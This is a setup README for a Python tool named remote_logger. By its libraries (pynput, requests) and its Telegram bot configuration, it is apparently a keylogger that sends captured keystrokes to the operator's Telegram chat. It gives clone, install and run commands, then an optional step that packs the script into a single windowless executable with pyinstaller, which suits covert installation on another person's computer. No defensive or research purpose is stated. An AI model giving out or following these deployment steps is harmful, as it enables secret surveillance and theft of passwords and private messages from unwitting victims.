Setup Instructions
1. Prerequisites
* Python 3.x installed on your system.
* Telegram bot set up (create one using BotFather and obtain your bot token).
* The pynput and requests Python libraries installed.

2. Installation
Clone or download this repository:
* git clone https://github.com/sreeragkavanoly/remotelogger.git
* cd remotelogger

Install the required dependencies:
* pip install pynput requests

Running the Script
* python remote_logger.py
* Edit the code before running the script and add your bot api(botfather) and your chat id(userinfobot).

Convert to Executable File (Optional)
* Install pyinstaller:
    * pip install pyinstaller
Convert the Python script to an executable:
* pyinstaller --onefile --noconsole remote_logger.py
